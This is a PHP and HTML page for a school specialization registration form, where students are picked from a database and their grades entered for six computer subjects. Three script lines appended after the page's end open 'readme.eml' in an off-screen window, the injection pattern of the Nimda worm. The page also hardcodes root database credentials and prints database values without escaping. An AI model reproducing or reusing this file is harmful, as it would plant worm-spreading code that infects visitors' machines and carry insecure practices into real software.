<?php
	mysql_connect("localhost","root","1");
	mysql_select_db("peminatan");
?>

<!DOCTYPE html>
<html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Peminatan</title>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />

        <script src="js/jquery.min.js"></script>
        <script src="js/skel.min.js"></script>
        <script src="js/skel-layers.min.js"></script>
        <script src="js/init.js"></script>
           </head>
    <body>

        <!-- Header -->
            <header id="header">
                <nav id="nav">
                    <ul>
                        <li><a href="index.php">Home</a></li>
                        <li><a href="tkj.php">TKJ</a></li>
                        <li><a href="linkpemi.php">Peminatan</a></li>
                        <li><a href="elements.php">Informasi</a></li>
                        <li><a href="galeri.php">Galeri</a><li>
                        <li><a href="login.php" class="button special">Sign In</a></li>
                    </ul>
                </nav>
            </header>
            </header>
<title>Peminatan</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
<style>
.button {
    background-color: #008CBA; /* Blue */
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
}

.button2 {background-color: #008CBA;} /* Blue */

</style>
</head>
<section id="main" class="wrapper">
                <div class="container">
<body>

<div class="w3-container w3-blue">
<center><h2>Pendaftaran</h2></center>
</div>
<form class="w3-container" name="peminatan" method="POST" action="view.php">

<select name="siswa">
	<option value="">=====Pilih Nama Siswa=====</option>
	<?php
	$q = mysql_query("select * from siswa");
	while ($r = mysql_fetch_array($q)){
		echo "<option value = ".$r['nis'].">".$r['nama']."</option>";
	}
	?>
	
</select>

<p><center><h3>
<label>Silahkan input nilai sesuai dengan mata pelajaran dibawah ini</label></h3></center></p>

<p>
<label>Pemograman Dasar</label>
<input class="w3-input" type="text" name="1"></p>

<p>
<label>Sistem Komputer</label>
<input class="w3-input" type="text" name="2"></p>

<p>
<label>Perakitan Komputer</label>
<input class="w3-input" type="text" name="3"></p>

<p>
<label>Simulasi Digital</label>
<input class="w3-input" type="text" name="4"></p>

<p>
<label>Jaringan Dasar</label>
<input class="w3-input" type="text" name="5"></p>

<p>
<label>Pemograman Web</label>
<input class="w3-input" type="text" name="6"></p>
<input type="submit" class="button" name="submit" value="submit">
<input type="reset" class="button button2" name="reset" value="reset">
</form>

</div>
            </section>

</body>
</html> 

<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
